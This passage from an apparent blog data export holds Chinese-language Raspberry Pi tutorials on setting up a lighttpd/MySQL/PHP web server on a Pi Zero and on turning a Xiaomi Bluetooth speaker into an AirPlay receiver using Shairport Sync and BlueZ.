root</code>更改root密码</p>\n<p>4.在本机设置代理</p>\n<p>首先，设置本机名为Mac，在本机搭建一个squid，为了使树莓派安装web server，以后日常使用不需要。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">brew update</div><div class=\"line\">brew install squid</div></pre></td></tr></table></figure>\n<p>5.然后下载<a href=\"http://squidman.net/squidman/\">SquidMan</a>，安装。<br>在本机开启端口为8080的HTTP代理服务，并把本机名称更为Mac。</p>\n<p>6.进入树莓派的shell，输入：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /etc/apt/apt.conf.d</div><div class=\"line\">sudo vi 50raspi</div></pre></td></tr></table></figure></p>\n<p>最后一行加入一句话：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">Acquire::http::Proxy &quot;http://Mac.local:8080&quot;;</div></pre></td></tr></table></figure></p>\n<p>保存</p>\n<p>7.继续输入<code>apt-get update</code>查看是否有网络。</p>\n<p>8.安装<code>lighthttpd+mysql+php</code></p>\n<p>输入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install lighttpd mysql-server php5-cgi php5-mysql</div></pre></td></tr></table></figure>\n<p>等待安装完毕后，修改<code>php.ini</code>设置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/php5/cgi/php.ini</div></pre></td></tr></table></figure>\n<p>去掉这一条注释的<code>;</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">;cgi.fix_pathinfo = 1</div></pre></td></tr></table></figure></p>\n<p>随后修改<code>lighttpd.conf</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/lighttpd/lighttpd.conf</div></pre></td></tr></table></figure></p>\n<p>在<code>server.modules</code>中增加<code>fastcgi</code><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">server.modules = (</div><div class=\"line\">&quot;mod_access&quot;,</div><div class=\"line\">&quot;mod_alias&quot;,</div><div class=\"line\">&quot;mod_compress&quot;,</div><div class=\"line\"># &quot;mod_redirect&quot;,</div><div class=\"line\">&quot;mod_fastcgi&quot;,</div><div class=\"line\"># &quot;mod_rewrite&quot;,</div><div class=\"line\">)</div></pre></td></tr></table></figure></p>\n<p>最后添加<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">fastcgi.server = ( &quot;.php&quot; =&gt; ((</div><div class=\"line\">    &quot;bin-path&quot; =&gt; &quot;/usr/bin/php5-cgi&quot;,</div><div class=\"line\">    &quot;socket&quot; =&gt; &quot;/tmp/php.socket&quot;</div><div class=\"line\">)))</div></pre></td></tr></table></figure></p>\n<p>重启lighttpd服务<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo /etc/init.d/lighttpd restart</div></pre></td></tr></table></figure></p>\n<p>通过scp协议，上传一个<code>index.php</code>文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">phpinfo();</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p>删除默认的<code>index.htm</code>文件，打开网站<code>http://自己树莓派名字.local</code><br>查看是否成功。</p>\n<p><img src=\"/content/images/zeroweb/1.png\" alt=\"\"></p>\n<p>不错，接下来的事情，就是把自己的源代码传到树莓派上，不过多叙述。</p>\n<h1 id=\"多说一句\"><a href=\"#多说一句\" class=\"headerlink\" title=\"多说一句\"></a>多说一句</h1><p>从此以后，你只需要带上你的树莓派Zero就可以随时随地的打开自己的私有web服务。但是，树莓派Zero的性能，确实不行，建议跑一跑小型的程序，不要跑太大的程序。</p>\n<p><img src=\"/content/images/zeroweb/2.png\" alt=\"\"></p>\n<p>至于应用嘛，其实做什么都可以的。</p>\n"},{"title":"用树莓派把蓝牙音响变成Airplay音响","id":"11","updated":"2016-08-07T22:28:30.000Z","date":"2016-08-07T20:23:56.000Z","_content":"\n# 前言\n最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。\n于是萌生了一个想法，正好手上有个树莓派，能不能这样：\n> iOS设备->Airplay->树莓派->蓝牙->小米蓝牙音箱\n<!-- more --> \n![](/content/images/2016/08/DSC07326-5.JPG)\n\n因此这个问题可以分为两个部分：\n\n* 1.树莓派蓝牙音频配置部分\n* 2.树莓派Airplay播放部分\n\n在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。\n\n# 原料\n* 树莓派3\n* 小米蓝牙音箱\n* iOS设备\n\n# 开始\n## 树莓派安装Shairport Sync\nShairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。\n安装前请确认是否安装以下依赖包：\n\n* `apt-get install build-essential git`\n* `apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev`\n* `apt-get install avahi-daemon libavahi-client-dev` \n* `apt-get install libssl-dev` \n* `apt-get install libpolarssl-dev` \n* `apt-get install libsoxr-dev` \n\n随后下载Shairport Sync：\n```bash\ngit clone https://github.com/mikebrady/shairport-sync.git\n```\n然后`cd`到相应目录，执行：\n```bash\nautoreconf -i -f\n```\n随后执行：\n```bash\n./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd\n```\n如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：\n```bash\nmake\n```\n创建开机启动：\n```bash\ngetent group shairport-sync &>/dev/null || sudo groupadd -r shairport-sync >/dev/null\n\ngetent passwd shairport-sync &> /dev/null || sudo useradd -r -M -g shairport-sync -s /usr/bin/nologin -G audio shairport-sync >/dev/null\n```\n然后运行：\n```bash\nsudo make install\n```\n最后输入，完成安装：\n```bash\nsudo update-rc.d shairport-sync defaults 90 10\n```\n## 树莓派安装蓝牙\n打开终端，用普通用户权限执行：\n```bash\nsudo apt-get update\nsudo apt-get updgrade -y\nsudo apt-get dist-upgrade -y\n```\n随后安装蓝牙及管理软件\n```bash\nsudo apt-get install pi-bluetooth bluez bluez-firmware blueman\n```\n将pi用户添加到蓝牙组\n```bash\nsudo usermod -G bluetooth -a pi\n```\n还有很**重要**的一条，安装蓝牙音频配置\n```bash\nsudo apt-get install pulseaudio pulseaudio-module-bluetooth\n```\n随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。\n也可通过bluetoothctl或hictool命令进行配对。\n随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。\n\n**在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。**\n## 配置蓝牙音频及Shariport Sync\n安装依赖包：\n```bash\nsudo apt-get install libdbus-1-dev\nsudo apt-get install libglib2.0-dev\napt-cache search libasound\nsudo apt-get install libasound2-dev\n```\n配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：\n```bash\nwget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz\ntar -xvf bluez-4.101.tar.xz\ncd bluez-4.101\n./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib\nmake\nsudo make install\n```\n复制配置文件到目录：\n```bash\nsudo cp /home/pi/bluez-4.101/test/simple-agent /usr/bin/bluez-simple-agent\nsudo cp /home/pi/bluez-4.101/test/test-device /usr/bin/bluez-test-device\nsudo cp /home/pi/bluez-4.101/test/test-audio /usr/bin/bluez-test-audio\nsudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/\n```\n接着运行：\n```bash\nsudo apt-get install python-dbus\nsudo apt-get install python-gobject\nsudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/\n```\n编辑audio.conf文件使shariport的音频从蓝牙设备输出：\n```bash\nsudo nano /etc/bluetooth/audio.conf\n```\n```bash\n# 在[General]区域添加:\nEnable=Sink,Socket\n# 取消[A2DP]注释，并加入:\nMaxconnections=4\n```\n打开蓝牙自启动:\n```bash\nsudo systemctl enable bluetooth\n```\n重启设备后，继续配置，打开asund.conf文件：\n```bash\nsudo nano /etc/asound.conf\n```\n```javascript\npcm.bt_canz {\ntype plug\nslave {\npcm {\ntype bluetooth\ndevice XX:XX:XX:XX:XX:XX\nprofile \"auto\"\n}\n}\nhint {\nshow on\ndescription \"Mi Speaker\"\n}\n}\nctl.bt_canz {\ntype bluetooth\n}\n```\n测试bluez能否使用：`sudo bluez-simple-agent\n`，如果正常，按ctrl+c停止。\n```bash\nsudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX\nsudo bluez-test-audio connect XX:XX:XX:XX:XX:XX\n```\n测试是否连通：`speaker-test -c 2 -D bt_canz`\n\n再次重启设备。\n开启后编辑`/etc/shairport-sync.conf `：\n```bash\nsudo nano /etc/shairport-sync.conf\n#去掉下面的注释，并加入bt_canz\noutput_device = bt_canz\n```\n保存！重启！开机即可用。\n![](/content/images/2016/08/IMG_0635.PNG)\n# 参考文章\nhttps://github.com/mikebrady/shairport-sync/issues/200\nhttps://github.com/mikebrady/shairport-sync\nhttp://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\nhttp://wangye.org/blog/archives/921/\nhttp://blog.csdn.net/huayucong/article/details/51376461\nhttp://blog.csdn.net/zhaoqi_0612/article/details/47731821\nhttp://blog.csdn.net/techtitan/article/details/6165116\nhttp://www.eeboard.com/bbs/forum.php?mod=viewthread&tid=45040&page=1","source":"_posts/用树莓派把蓝牙音响变成Airplay音响.md","raw":"---\ntitle: 用树莓派把蓝牙音响变成Airplay音响\ntags: 'Raspberry'\npermalink: airplay\nid: 11\nupdated: '2016-08-07 23:28:30'\ndate: 2016-08-07 21:23:56\n---\n\n# 前言\n最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。\n于是萌生了一个想法，正好手上有个树莓派，能不能这样：\n> iOS设备->Airplay->树莓派->蓝牙->小米蓝牙音箱\n<!-- more --> \n![](/content/images/2016/08/DSC07326-5.JPG)\n\n因此这个问题可以分为两个部分：\n\n* 1.树莓派蓝牙音频配置部分\n* 2.树莓派Airplay播放部分\n\n在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。\n\n# 原料\n* 树莓派3\n* 小米蓝牙音箱\n* iOS设备\n\n# 开始\n## 树莓派安装Shairport Sync\nShairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。\n安装前请确认是否安装以下依赖包：\n\n* `apt-get install build-essential git`\n* `apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev`\n* `apt-get install avahi-daemon libavahi-client-dev` \n* `apt-get install libssl-dev` \n* `apt-get install libpolarssl-dev` \n* `apt-get install libsoxr-dev` \n\n随后下载Shairport Sync：\n```bash\ngit clone https://github.com/mikebrady/shairport-sync.git\n```\n然后`cd`到相应目录，执行：\n```bash\nautoreconf -i -f\n```\n随后执行：\n```bash\n./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd\n```\n如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：\n```bash\nmake\n```\n创建开机启动：\n```bash\ngetent group shairport-sync &>/dev/null || sudo groupadd -r shairport-sync >/dev/null\n\ngetent passwd shairport-sync &> /dev/null || sudo useradd -r -M -g shairport-sync -s /usr/bin/nologin -G audio shairport-sync >/dev/null\n```\n然后运行：\n```bash\nsudo make install\n```\n最后输入，完成安装：\n```bash\nsudo update-rc.d shairport-sync defaults 90 10\n```\n## 树莓派安装蓝牙\n打开终端，用普通用户权限执行：\n```bash\nsudo apt-get update\nsudo apt-get updgrade -y\nsudo apt-get dist-upgrade -y\n```\n随后安装蓝牙及管理软件\n```bash\nsudo apt-get install pi-bluetooth bluez bluez-firmware blueman\n```\n将pi用户添加到蓝牙组\n```bash\nsudo usermod -G bluetooth -a pi\n```\n还有很**重要**的一条，安装蓝牙音频配置\n```bash\nsudo apt-get install pulseaudio pulseaudio-module-bluetooth\n```\n随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。\n也可通过bluetoothctl或hictool命令进行配对。\n随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。\n\n**在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。**\n## 配置蓝牙音频及Shariport Sync\n安装依赖包：\n```bash\nsudo apt-get install libdbus-1-dev\nsudo apt-get install libglib2.0-dev\napt-cache search libasound\nsudo apt-get install libasound2-dev\n```\n配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：\n```bash\nwget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz\ntar -xvf bluez-4.101.tar.xz\ncd bluez-4.101\n./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib\nmake\nsudo make install\n```\n复制配置文件到目录：\n```bash\nsudo cp /home/pi/bluez-4.101/test/simple-agent /usr/bin/bluez-simple-agent\nsudo cp /home/pi/bluez-4.101/test/test-device /usr/bin/bluez-test-device\nsudo cp /home/pi/bluez-4.101/test/test-audio /usr/bin/bluez-test-audio\nsudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/\n```\n接着运行：\n```bash\nsudo apt-get install python-dbus\nsudo apt-get install python-gobject\nsudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/\n```\n编辑audio.conf文件使shariport的音频从蓝牙设备输出：\n```bash\nsudo nano /etc/bluetooth/audio.conf\n```\n```bash\n# 在[General]区域添加:\nEnable=Sink,Socket\n# 取消[A2DP]注释，并加入:\nMaxconnections=4\n```\n打开蓝牙自启动:\n```bash\nsudo systemctl enable bluetooth\n```\n重启设备后，继续配置，打开asund.conf文件：\n```bash\nsudo nano /etc/asound.conf\n```\n```javascript\npcm.bt_canz {\ntype plug\nslave {\npcm {\ntype bluetooth\ndevice XX:XX:XX:XX:XX:XX\nprofile \"auto\"\n}\n}\nhint {\nshow on\ndescription \"Mi Speaker\"\n}\n}\nctl.bt_canz {\ntype bluetooth\n}\n```\n测试bluez能否使用：`sudo bluez-simple-agent\n`，如果正常，按ctrl+c停止。\n```bash\nsudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX\nsudo bluez-test-audio connect XX:XX:XX:XX:XX:XX\n```\n测试是否连通：`speaker-test -c 2 -D bt_canz`\n\n再次重启设备。\n开启后编辑`/etc/shairport-sync.conf `：\n```bash\nsudo nano /etc/shairport-sync.conf\n#去掉下面的注释，并加入bt_canz\noutput_device = bt_canz\n```\n保存！重启！开机即可用。\n![](/content/images/2016/08/IMG_0635.PNG)\n# 参考文章\nhttps://github.com/mikebrady/shairport-sync/issues/200\nhttps://github.com/mikebrady/shairport-sync\nhttp://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\nhttp://wangye.org/blog/archives/921/\nhttp://blog.csdn.net/huayucong/article/details/51376461\nhttp://blog.csdn.net/zhaoqi_0612/article/details/47731821\nhttp://blog.csdn.net/techtitan/article/details/6165116\nhttp://www.eeboard.com/bbs/forum.php?mod=viewthread&tid=45040&page=1","slug":"airplay","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xpi003q5es5k1q1jlpj","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>\n<blockquote>\n<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br><a id=\"more\"></a><br><img src=\"/content/images/2016/08/DSC07326-5.JPG\" alt=\"\"></p>\n</blockquote>\n<p>因此这个问题可以分为两个部分：</p>\n<ul>\n<li>1.树莓派蓝牙音频配置部分</li>\n<li>2.树莓派Airplay播放部分</li>\n</ul>\n<p>在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。</p>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3</li>\n<li>小米蓝牙音箱</li>\n<li>iOS设备</li>\n</ul>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><h2 id=\"树莓派安装Shairport-Sync\"><a href=\"#树莓派安装Shairport-Sync\" class=\"headerlink\" title=\"树莓派安装Shairport Sync\"></a>树莓派安装Shairport Sync</h2><p>Shairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。<br>安装前请确认是否安装以下依赖包：</p>\n<ul>\n<li><code>apt-get install build-essential git</code></li>\n<li><code>apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev</code></li>\n<li><code>apt-get install avahi-daemon libavahi-client-dev</code> </li>\n<li><code>apt-get install libssl-dev</code> </li>\n<li><code>apt-get install libpolarssl-dev</code> </li>\n<li><code>apt-get install libsoxr-dev</code> </li>\n</ul>\n<p>随后下载Shairport Sync：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/mikebrady/shairport-sync.git</div></pre></td></tr></table></figure></p>\n<p>然后<code>cd</code>到相应目录，执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">autoreconf -i <span class=\"_\">-f</span></div></pre></td></tr></table></figure></p>\n<p>随后执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd</div></pre></td></tr></table></figure></p>\n<p>如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">make</div></pre></td></tr></table></figure></p>\n<p>创建开机启动：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">getent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/null</div><div class=\"line\"></div><div class=\"line\">getent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync <span class=\"_\">-s</span> /usr/bin/nologin -G audio shairport-sync &gt;/dev/null</div></pre></td></tr></table></figure></p>\n<p>然后运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>最后输入，完成安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo update-rc.d shairport-sync defaults 90 10</div></pre></td></tr></table></figure></p>\n<h2 id=\"树莓派安装蓝牙\"><a href=\"#树莓派安装蓝牙\" class=\"headerlink\" title=\"树莓派安装蓝牙\"></a>树莓派安装蓝牙</h2><p>打开终端，用普通用户权限执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get updgrade -y</div><div class=\"line\">sudo apt-get dist-upgrade -y</div></pre></td></tr></table></figure></p>\n<p>随后安装蓝牙及管理软件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pi-bluetooth bluez bluez-firmware blueman</div></pre></td></tr></table></figure></p>\n<p>将pi用户添加到蓝牙组<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo usermod -G bluetooth <span class=\"_\">-a</span> pi</div></pre></td></tr></table></figure></p>\n<p>还有很<strong>重要</strong>的一条，安装蓝牙音频配置<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pulseaudio pulseaudio-module-bluetooth</div></pre></td></tr></table></figure></p>\n<p>随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。<br>也可通过bluetoothctl或hictool命令进行配对。<br>随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。</p>\n<p><strong>在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。</strong></p>\n<h2 id=\"配置蓝牙音频及Shariport-Sync\"><a href=\"#配置蓝牙音频及Shariport-Sync\" class=\"headerlink\" title=\"配置蓝牙音频及Shariport Sync\"></a>配置蓝牙音频及Shariport Sync</h2><p>安装依赖包：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install libdbus-1-dev</div><div class=\"line\">sudo apt-get install libglib2.0-dev</div><div class=\"line\">apt-cache search libasound</div><div class=\"line\">sudo apt-get install libasound2-dev</div></pre></td></tr></table></figure></p>\n<p>配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz</div><div class=\"line\">tar -xvf bluez-4.101.tar.xz</div><div class=\"line\"><span class=\"built_in\">cd</span> bluez-4.101</div><div class=\"line\">./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib</div><div class=\"line\">make</div><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>复制配置文件到目录：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/simple-agent /usr/bin/bluez-simple-agent</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-device /usr/bin/bluez-test-device</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-audio /usr/bin/bluez-test-audio</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/</div></pre></td></tr></table></figure></p>\n<p>接着运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install python-dbus</div><div class=\"line\">sudo apt-get install python-gobject</div><div class=\"line\">sudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/</div></pre></td></tr></table></figure></p>\n<p>编辑audio.conf文件使shariport的音频从蓝牙设备输出：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/bluetooth/audio.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 在[General]区域添加:</span></div><div class=\"line\">Enable=Sink,Socket</div><div class=\"line\"><span class=\"comment\"># 取消[A2DP]注释，并加入:</span></div><div class=\"line\">Maxconnections=4</div></pre></td></tr></table></figure>\n<p>打开蓝牙自启动:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> bluetooth</div></pre></td></tr></table></figure></p>\n<p>重启设备后，继续配置，打开asund.conf文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/asound.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">pcm.bt_canz &#123;</div><div class=\"line\">type plug</div><div class=\"line\">slave &#123;</div><div class=\"line\">pcm &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">device XX:XX:XX:XX:XX:XX</div><div class=\"line\">profile <span class=\"string\">\"auto\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">hint &#123;</div><div class=\"line\">show on</div><div class=\"line\">description <span class=\"string\">\"Mi Speaker\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">ctl.bt_canz &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>测试bluez能否使用：<code>sudo bluez-simple-agent</code>，如果正常，按ctrl+c停止。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX</div><div class=\"line\">sudo bluez-test-audio connect XX:XX:XX:XX:XX:XX</div></pre></td></tr></table></figure></p>\n<p>测试是否连通：<code>speaker-test -c 2 -D bt_canz</code></p>\n<p>再次重启设备。<br>开启后编辑<code>/etc/shairport-sync.conf</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/shairport-sync.conf</div><div class=\"line\"><span class=\"comment\">#去掉下面的注释，并加入bt_canz</span></div><div class=\"line\">output_device = bt_canz</div></pre></td></tr></table></figure></p>\n<p>保存！重启！开机即可用。<br><img src=\"/content/images/2016/08/IMG_0635.PNG\" alt=\"\"></p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://github.com/mikebrady/shairport-sync/issues/200\" target=\"_blank\" rel=\"external\">https://github.com/mikebrady/shairport-sync/issues/200</a><br><a href=\"https://github.com/mikebrady/shairport-sync\" target=\"_blank\" 